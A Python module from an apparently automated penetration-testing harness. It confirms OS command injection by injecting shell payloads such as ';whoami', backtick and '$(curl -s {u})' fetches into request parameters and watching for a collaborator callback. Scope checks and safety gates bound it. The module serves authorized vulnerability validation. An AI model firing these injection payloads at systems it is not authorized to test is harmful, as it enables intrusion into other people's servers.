"""
OS command-injection confirmation leg (deterministic, OOB via the in-process
collaborator).

The command_injection agent can only GUESS that a parameter reaches a shell. This
proves it out-of-band the same way the SSRF/XXE legs do: inject a shell payload
whose only effect is to fetch a unique collaborator URL, send the request, and
watch for the target to CALL BACK. A callback is proof the injected command ran
-- confirmed command injection -- with zero reliance on the response body (blind
injection included) and without running any payload that reads, writes, or
destroys anything on the target (the fetch is the whole payload).

Fires on command_injection findings; injects into every query/body parameter.
Scope-gated; active (validators.active_enabled), and mutating replays of a non-GET
capture additionally need validators.allow_mutating_replay (safety gate).
"""
from __future__ import annotations

import secrets
from urllib.parse import urlsplit

import httpx

import harness.collaborator as _collab
from harness import global_throttle
from harness.models import Finding, HttpExchange
from harness.safety_gate import GatedAsyncClient, get_default_gate, SafetyGateBlocked
from .base import Validator, ValidationResult
from .injection_targets import param_targets, mutate, replay_headers

# Shell metacharacters that break out of the surrounding command, tried in order.
# `{u}` is the collaborator URL. Covers POSIX (`;`, `|`, `$()`, backticks,
# newline) and Windows cmd (`&`), and both curl and wget as the fetch tool so the
# leg does not depend on which is installed. Each is a self-contained fetch: the
# callback alone is the signal, so no output needs to come back in-band.
_TEMPLATES = (
    ";curl -s {u}",
    ";wget -qO- {u}",
    "|curl -s {u}",
    "$(curl -s {u})",
    "`curl -s {u}`",
    "&curl -s {u}",
    "\ncurl -s {u}\n",
)
# Bound the fan-out: params x templates sends per finding.
_MAX_PARAMS = 6
# The expected marker is assembled by the shell from two separated pieces, so
# a plain reflector never contains it. POSIX `printf` joins an argument through
# `%s`; Windows cmd removes the caret escape before echoing.
_INBAND = (";whoami;printf {a}%s {b}", "|whoami;printf {a}%s {b}",
           "& whoami & echo {a}^{b}")


class CommandInjectionValidator(Validator):
    name = "command_injection"
    finding_classes = {"command_injection", "command injection", "os command injection",
                       "rce", "remote code execution", "code injection", "shell injection"}
    active = True

    def __init__(self, *, allowed_hosts: list[str] | None = None, timeout: float = 10.0,
                 collaborator=None, run_context=None):
        self.allowed_hosts = allowed_hosts or []
        self.timeout = timeout
        self._collab = collaborator
        self.run_context = run_context

    def collab(self):
        return self._collab or _collab.shared()

    def applies(self, finding: Finding, exchange: HttpExchange) -> bool:
        return super().applies(finding, exchange) and bool(param_targets(exchange))

    def _skip(self, why: str) -> ValidationResult:
        return ValidationResult(self.name, "skipped", "command_injection", summary=why)

    async def validate(self, finding: Finding, exchange: HttpExchange) -> ValidationResult:
        host = urlsplit(exchange.url).hostname or ""
        if self.allowed_hosts and host not in self.allowed_hosts:
            return self._skip(f"host {host!r} out of scope")
        targets = param_targets(exchange)[:_MAX_PARAMS]
        if not targets:
            return self._skip("no parameter to inject a shell payload into")
        collab = self.collab()
        method = (exchange.method or "GET").upper()
        headers = replay_headers(exchange)
        session_ref = None
        request_headers = headers
        if self.run_context is not None:
            from .transport import bind_session
            session_ref, request_headers = bind_session(self.run_context, headers)

        async def send(url: str, body: str) -> tuple[str, str]:
            if self.run_context is not None:
                from harness.run_context import TypedRequest
                outcome = await self.run_context.executor().execute(
                    TypedRequest(method, url, headers=request_headers, body=body or None),
                    capability=self.name, session_ref=session_ref,
                    case_ref=finding.finding_id or "", max_redirects=0)
                if not outcome.executed:
                    return outcome.outcome, ""
                return outcome.outcome, outcome.body or ""
            await global_throttle.acquire()
            async with GatedAsyncClient(get_default_gate(), self.name, timeout=self.timeout,
                                        follow_redirects=False, verify=False) as client:
                resp = await client.request(method, url, headers=headers or None,
                                            content=body or None)
            return "ok", resp.text

        # Prefer an in-band unique marker. Including `whoami` keeps the probe
        # read-only while exercising a real command and works on the canonical
        # stock-check command-injection shape. The nonce prevents ordinary
        # reflection or pre-existing page content from confirming the class.
        for loc, param in targets:
            token = secrets.token_hex(6)
            marker_a, marker_b = f"HV{token[:6]}", token[6:]
            marker = marker_a + marker_b
            for tmpl in _INBAND:
                payload = tmpl.format(a=marker_a, b=marker_b)
                url, body = mutate(exchange, loc, param, payload)
                try:
                    state, text = await send(url, body)
                except SafetyGateBlocked:
                    return self._skip("mutating command-injection replay not authorized "
                                      "(set validators.allow_mutating_replay)")
                except httpx.HTTPError:
                    continue
                if state not in ("ok", "error"):
                    return self._skip(f"command-injection replay declined: {state}")
                if marker in text:
                    return ValidationResult(
                        self.name, "confirmed", "command_injection", confidence=0.95,
                        confirmed=True,
                        summary=f"OS command injection confirmed: the {loc} parameter {param!r} "
                                "executed a shell command.",
                        evidence=f"Injected `{tmpl.format(a='<nonce-a>', b='<nonce-b>')}` "
                                 f"into {param!r}; "
                                 "the response contained the unique command-output marker.")

        # A loopback collaborator cannot be reached by a remote target. Avoid
        # multiplying the configured timeout across payloads when it cannot
        # produce evidence; explicit/external collaborators still cover blind
        # command injection.
        collab_host = urlsplit(collab.url("reachability-check")).hostname or ""
        target_host = urlsplit(exchange.url).hostname or ""
        if collab_host in {"127.0.0.1", "localhost", "::1"} and target_host not in {
                "127.0.0.1", "localhost", "::1"}:
            return ValidationResult(
                self.name, "not_confirmed", "command_injection", confidence=0.0,
                confirmed=False,
                summary="No in-band command-output marker observed",
                evidence=f"Tried {len(targets)} parameter(s) across {len(_INBAND)} "
                         "in-band shell forms; loopback collaborator was not reachable from the target.")
        blocked = False
        for loc, param in targets:
            for tmpl in _TEMPLATES:
                token = collab.token()
                payload = tmpl.format(u=collab.url(token))
                url, body = mutate(exchange, loc, param, payload)
                try:
                    state, _ = await send(url, body)
                    if state not in ("ok", "error"):
                        blocked = True
                        break
                except SafetyGateBlocked:
                    blocked = True
                    break  # mutating replay not authorized -- no point trying more templates
                except httpx.HTTPError:
                    continue
                if await collab.wait_for_hit(token, timeout=self.timeout):
                    return ValidationResult(
                        self.name, "confirmed", "command_injection", confidence=0.95, confirmed=True,
                        summary=f"OS command injection confirmed: a shell payload placed in the {loc} "
                                f"parameter {param!r} executed on the server.",
                        evidence=f"Injected a metacharacter-prefixed fetch (`{tmpl.format(u='<collaborator>')}`) "
                                 f"into {param!r}; the target ran it and called back out-of-band (blind-safe).")
            if blocked:
                break
        if blocked:
            return self._skip("mutating command-injection replay not authorized "
                              "(set validators.allow_mutating_replay)")
        return ValidationResult(
            self.name, "not_confirmed", "command_injection", confidence=0.0, confirmed=False,
            summary="No out-of-band callback observed -- parameters do not appear to reach a shell",
            evidence=f"Tried {len(targets)} parameter(s) x {len(_TEMPLATES)} shell payloads; "
                     f"no collaborator hit within the window.")
